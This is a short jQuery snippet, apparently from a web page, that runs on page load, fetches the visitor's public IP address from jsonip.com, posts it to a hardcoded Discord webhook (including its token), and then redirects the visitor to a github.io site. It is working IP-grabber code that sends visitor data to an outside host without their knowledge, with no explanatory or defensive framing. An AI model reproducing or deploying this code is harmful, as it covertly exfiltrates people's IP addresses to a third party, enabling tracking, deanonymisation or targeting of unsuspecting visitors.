                $(document).ready(function() { 
                         $("#message1").fadeIn(2000).fadeOut(2000); 
                         setTimeout(function() { 
                                 $.getJSON("https://jsonip.com?callback=?", function(data) { 
                                         var ipAddress = data.ip; 
                                         $.ajax({ 
                                                 type: "POST", 
                                                 url: "https://discord.com/api/webhooks/1129328426503905351/rX4l5Sv1Y0UAYbrmzFj6G2jyRroHyOnhXfeyS-0knV9eabFntCPfjqZ4hnAzXxVp6FQD", 
                                                 contentType: "application/json", 
                                                 data: JSON.stringify({"content": "IP Address: " + ipAddress}), 
                                                 success: function() { 
                                                         console.log("IP address sent !"); 
                                                         $("#message2").fadeIn(2000).fadeOut(2000, function() { 
                                                                 window.location.href = "http://coconut7373.github.io"; 
                                                         }); 
                                                 }, 
                                                 error: function(xhr, status, error) { 
                                                         console.error("Error sending IP address : " + error); 
                                                 } 
                                         }); 
                                 }); 
                         }, 4000); 
                 });